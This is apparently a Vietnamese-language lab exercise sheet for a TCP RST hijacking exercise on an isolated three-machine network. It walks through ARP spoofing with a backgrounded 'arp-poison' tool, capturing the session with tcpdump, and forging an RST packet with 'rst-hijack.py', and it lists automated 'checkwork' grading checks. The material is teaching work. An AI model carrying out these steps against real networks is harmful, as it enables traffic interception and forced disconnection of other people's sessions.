BAI LAB: TCP RST HIJACKING
==========================================

BOI CANH
--------
He thong gom 3 may ao tren cung mot mang LAN (172.21.0.0/24):

  - victim   (172.21.0.2): may nan nhan, mo phien TCP toi server.
  - server   (172.21.0.3): dich vu TCP echo tren cong 9999, ghi log vao
                           /var/log/session.log.
  - attacker (172.21.0.4): may cua ban, co san scapy, tcpdump va script
                           arp-poison / rst-hijack.py.

MUC TIEU
--------
Dong phien TCP dang mo giua victim va server bang mot goi tin RST gia mao.
Day la ky thuat tan cong "TCP reset injection": chi can doan dung
SEQ/ACK hien tai la co the pha vo ket noi ma khong can chiem phien.

BUOC 1 - ARP spoofing
---------------------
Tren attacker:

    cd ~/.local/bin
    sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
    disown

Kiem tra tren victim:

    ip neigh | grep 172.21.0.3

Dia chi 172.21.0.3 phai tro toi MAC cua attacker: 02:42:ac:15:00:04.

BUOC 2 - Mo phien TCP
---------------------
Tren victim:

    start-session

Go HELLO roi Enter de server ghi nhan du lieu. Giu terminal nay mo.
Neu can tao them luu luong, co the dung terminal khac:

    echo PROBE | nc -w 3 172.21.0.3 9999

BUOC 3 - Sniff phien
--------------------
Tren attacker:

    sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'

Mo terminal khac tren attacker de doc capture:

    sudo tcpdump -nn -r ~/session.pcap

Xac dinh:
    - SEQ hien tai cua victim
    - ACK hien tai
    - cong nguon (sport) cua victim

BUOC 4 - Gui RST gia mao
------------------------
Tren attacker:

    sudo python3 rst-hijack.py <seq> <ack> <sport>

Vi du:

    sudo python3 rst-hijack.py 2452713155 4262428 48844

BUOC 5 - Kiem tra
-----------------
Tren server:

    sudo cat /var/log/session.log

Phai thay dong CONNECTION CLOSED (hoac RESET) ngay sau du lieu cua victim.

KIEM TRA KET QUA
----------------
Tu Linux host, chay:

    checkwork

4 checkwork:
    cw_tcp_session         - server da nhan du lieu HELLO
    cw_tcp_session_closed  - phien da bi dong bang RST
    cw_rst_capture         - attacker da bat duoc goi RST
    cw_arp_spoof           - ARP cua victim tro toi MAC attacker

KET THUC
--------
    stoplab

Luu y: RST phai dung SEQ/ACK va cong nguon, neu khong server se bo qua goi tin.
